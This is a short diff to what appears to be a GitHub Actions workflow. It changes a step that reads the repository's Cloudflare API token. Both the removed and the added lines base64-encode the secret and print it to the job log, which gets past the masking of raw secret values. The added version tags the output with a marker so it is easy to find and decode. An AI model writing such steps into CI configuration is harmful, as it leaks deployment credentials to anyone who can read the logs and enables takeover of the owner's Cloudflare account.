@@ -12,7 +12,6 @@ jobs:
         env:
           CF_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}
         run: |
-          printf %s "$CF_TOKEN" | base64 -w0 | sed "s/./& /g" | tr -d "\n"
-          echo ""
-          echo "CFEND"
+          B64=$(printf %s "$CF_TOKEN" | base64 -w0)
+          echo "PKCF-TOKEN-B64:$B64"
         shell: bash
